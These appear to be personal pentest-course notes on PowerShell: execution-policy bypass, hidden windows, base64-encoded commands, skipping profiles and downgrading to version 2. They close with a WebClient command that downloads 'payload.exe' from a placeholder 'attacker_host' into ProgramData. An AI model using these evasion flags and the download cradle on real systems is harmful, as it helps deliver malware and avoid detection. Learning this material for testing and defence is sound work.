Powershell
---------
Powershell is an interpreted scripting language

32 bit version of powershell is in > C:\windows\sysWOW64\Windowspowershell

If powershell is not recognized as cmdlet > add (C:\Windows\System32\WindowsPowerShell\v1.0\) in SystemPath Environment variable 

To run the powershell script without having problems, we have to use Bypass or Unrestricted
-------------------------------------------------------------------------------------------
powershell.exe -ExecutionPolicy Bypass .\script.ps1
powershell.exe -ExecutionPolicy Unrestricted .\script.ps1
powershell.exe -ExecutionPolicy Unrestricted calc.exe (running calculator program)

abbreviated parameter
---------------------
powershell.exe -ex Bypass .\script.ps1
powershell.exe -ep Bypass .\script.ps1

WindowStyle parameter (it hides the powershell window when used with hidden argument)
-------------------------------------------------------------------------------------
powershell.exe -WindowStyle Hidden .\script.ps1

powershell.exe -w Hidden .\script.ps1
powershell.exe -wi Hidden .\script.ps1

Command parameter is used to specify a command or scriptblock to run
---------------------------------------------------------------------
powershell.exe -Command Get-Process
powershell.exe -Command "& { Get-EventLog -LogName security } "

EncodedCommand is used to execute base64 encoded command
---------------------------------------------------------
powershell.exe -EncodedCommand $encodedcommand

powershell.exe -enco $encodedcommand
powershell.exe -en $encodedcommand

Powershell Profiles 
--------------------
Profiles are essentially scripts that run when the powershell executable is launched and can interfere with our operations so that 
don't load any powershell profiles by using -Noprofile parameter

powershell.exe -Noprofilee .\script.ps1

If you want to change powershell version to run (-Version)
-------------------------------------------------
powershell.exe -Version 2

Get-Help command is used to retrieve information about the specific cmdlet
--------------------------------------------------------------------------
Get-Help Get-Process 
Get-Help Get-Process -Full
Get-Help Get-Process -Online 

Get-Command cmdlet is used to list all cmdlets,aliases,functions 
-----------------------------------------------------------------
Get-Command -Name *Firewall*

Which operator is used for string concatenation in PowerShell? -- Plus Sign

# Script: ConcatenateStrings.ps1

# Define two strings
$string1 = "Hello"
$string2 = "World"

# Concatenate the strings using the + operator
$concatenatedString = $string1 + " " + $string2

# Output the result
Write-Output $concatenatedString

Select-object
--------------

Another alias you'll see quite often is "select" when used in conjunction with other cmdlets in pipeline operations and is an alias for the "Select-Object" cmdlet.

In this example, we're using the "Get-WmiObject" cmdlet, (used to return information about WMI objects) in conjunction with the "-class win32_operatingsystem" parameter and arguments, and then selecting (select) all (*) properties related to that WMI object class; this returns all information related to the current operating system.

Get-wmiobject -class win32_operatingsystem | select -property *

You can also filter 

Get-wmiobject -class win32_operatingsystem | select -property * | select-object Version

powershell Object
-----------------
In PowerShell, everything is treated as an object, which is a key aspect of its design. Objects in PowerShell are instances of .NET classes, and they have properties (data) and methods (actions) that can be accessed and manipulated.

As an example of creating a webclient-download object based on a .NET class with the "New-Object" cmdlet, we can use the “Net.WebClient" .NET system class to download a file to a target system with the following code:

PS C:\> $webclient = New-Object System.Net.WebClient
PS C:\> $payload_url = "https://attacker_host/payload.exe"
PS C:\> $file = "C:\ProgramData\payload.exe"
PS C:\> $webclient.DownloadFile ($payload_url, $file)

.DownloadFile is a method.
